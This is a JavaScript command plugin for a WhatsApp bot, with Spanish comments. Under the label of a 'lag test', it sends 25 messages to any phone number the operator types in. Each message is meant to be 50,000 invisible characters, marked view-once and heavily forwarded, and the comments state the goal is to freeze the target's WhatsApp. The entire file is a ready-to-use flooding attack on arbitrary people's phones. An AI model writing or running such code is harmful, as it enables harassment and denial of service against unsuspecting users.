let handler = async (m, { conn, args, usedPrefix, command }) => {
  let number = args[0];

  if (!number || !number.match(/^\d{5,}$/)) {
    return m.reply(`✳️ *Formato incorrecto*\n\n📌 Usa: *${usedPrefix + command} 573001234567*`);
  }

  let jid = number + "@s.whatsapp.net";
  let times = 25; // más veces, más freeze
  let textoLagger = ''.repeat(50000); // carácter invisible (U+200B) × 50k

  m.reply(`🚨 *Lag Test masivo iniciado* a ${jid}\n📨 *Repeticiones:* ${times}\n❗ Esto puede tardar...`);

  for (let i = 0; i < times; i++) {
    try {
      await conn.sendMessage(jid, {
        text: textoLagger,
        viewOnce: true,
        contextInfo: {
          forwardingScore: 999,
          isForwarded: true
        }
      });
      await new Promise(res => setTimeout(res, 150)); // delay entre mensajes
    } catch (e) {
      console.error(`❌ Error en mensaje ${i + 1}:`, e);
    }
  }

  m.reply("✅ *Lag Test finalizado.* Si no se congeló, ese WhatsApp tiene GPU gamer 🧠🔥");
};

handler.command = /^lagtestnum$/i;
handler.owner = true;
export default handler;